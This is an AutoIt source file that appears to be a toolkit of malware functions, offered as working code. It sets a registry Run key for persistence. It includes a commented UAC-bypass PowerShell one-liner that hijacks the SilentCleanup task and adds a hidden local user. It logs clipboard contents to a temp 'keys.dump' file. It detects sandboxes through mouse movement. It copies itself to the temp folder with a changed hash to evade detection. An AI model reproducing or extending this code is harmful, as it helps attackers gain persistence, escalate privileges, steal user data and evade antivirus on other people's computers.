#include <MsgBoxConstants.au3>
#include <FileConstants.au3>
#include <WinAPIFiles.au3>

;Get the exe persistent for current user
Func SetPersistent4CurrentUser()
   RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "System", "REG_SZ", @ScriptDir & "\" & @ScriptName)
EndFunc

Func MessageBox($title, $text)
   MsgBox($MB_SYSTEMMODAL, $title, $text , 10)
EndFunc

;Run powershell command with elevated permissions UAC
Func RunElevated($buffer = 'cd..;cd..;dir;Read-Host -Prompt "Press";')
   $buffer01 = "powershell.exe -Command ";
   $buffer02 = '"Start-Process powershell -Verb runAs ' & "'";
   $buffer00 = $buffer01 & $buffer02 & $buffer & "'" & '"';
   RunWait($buffer00);
EndFunc

;Run powershell command with elevated permissions WITHOUT UAC
;WORK IN Progress;
;if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {net user martino testP4ss /add} else {$registryPath = "HKCU:\Environment";$Name = "windir";$Value = "powershell -ep bypass -w h $PSCommandPath;#";Set-ItemProperty -Path $registryPath -Name $name -Value $Value;schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null;Remove-ItemProperty -Path $registryPath -Name $name}
Func RunElevatedNoUAC($buffer = 'cd..;cd..;dir;Read-Host -Prompt "Press";')
   $buffer01 = "powershell.exe -Command ";
   $buffer02 = '"Start-Process powershell -Verb runAs ' & "'";
   $buffer00 = $buffer01 & $buffer02 & $buffer & "'" & '"';
   RunWait($buffer00);
EndFunc

;Log to file the data stored in the clipboard
Func clipboard2Log($timeOut = 10, $pathLog = @TempDir & "\keys.dump")
   $buffer=""
   While 1
	  if $timeOut > 0 Then
		 $Data = ClipGet()
		 Sleep(1000)
		 if $buffer <> $Data Then
			$buffer = $Data
			Log2File($buffer, $pathLog)
		 EndIf
		 $timeOut=$timeOut-1
	  Else
		 return True
	  EndIf
   WEnd
EndFunc

Func Log2File($log, $pathFile)
    ;Local Const $sFilePath = _WinAPI_GetTempFileName(@TempDir)
	Local Const $sFilePath = $pathFile
    Local $hFileOpen = FileOpen($sFilePath, $FO_APPEND)
	   If $hFileOpen = -1 Then
		   MsgBox($MB_SYSTEMMODAL, "", "An error occurred whilst writing the temporary file.")
		   Return False
	   EndIf
    FileWrite($hFileOpen, $log & @CRLF)
    FileClose($hFileOpen)
 EndFunc

Func DetectMouseMoving()
   Local $MousePos = MouseGetPos()
   Local $hTimer = TimerInit()
   while 1
	  If $MousePos[0] <> MouseGetPos()[0] Then
		 Return 1
	  EndIf
	  if TimerDiff($hTimer) > 5000 Then
		  MsgBox($MB_SYSTEMMODAL, "", ":(")
		 Exit
	  EndIf
   WEnd
EndFunc

;random string generator
Func RandomString()
   $out = ""
   Dim $buffer[3]
   $digits = 8
   For $i = 1 To $digits
	   $buffer[0] = Chr(Random(65, 90, 1)) ;A-Z
	   $buffer[1] = Chr(Random(97, 122, 1)) ;a-z
	   $buffer[2] = Chr(Random(48, 57, 1)) ;0-9
	   $out &= $buffer[Random(0, 2, 1)]
   Next
   Return $out & ".exe"
EndFunc

;copy myself into temp changing hash
Func CopyTempRun($newName = RandomString())
   FileCopy(@ScriptDir & "\" & @ScriptName, @TempDir & "\" & $newName, $FC_OVERWRITE + $FC_CREATEPATH)
   Local $hFileOpen = FileOpen(@TempDir & "\" & $newName, $FO_APPEND)
   If $hFileOpen = -1 Then
	  Return False
   EndIf
   FileWriteLine($hFileOpen, "1")
   FileClose($hFileOpen)
   RunWait(@TempDir & "\" & $newName);
EndFunc

Func isRunningFromTemp()
   if (@ScriptDir & "\" & @ScriptName == @TempDir & "\" & @ScriptName) Then
	  Return 1
   EndIf
EndFunc

;if it's not running from temp, drop child to temp with different hash
Func Move2Temp($newName = RandomString())
   if (@ScriptDir & "\" & @ScriptName == @TempDir & "\" & @ScriptName) Then
	  Return 1
   Else
	  CopyTempRun($newName)
	  Exit
   EndIf
EndFunc




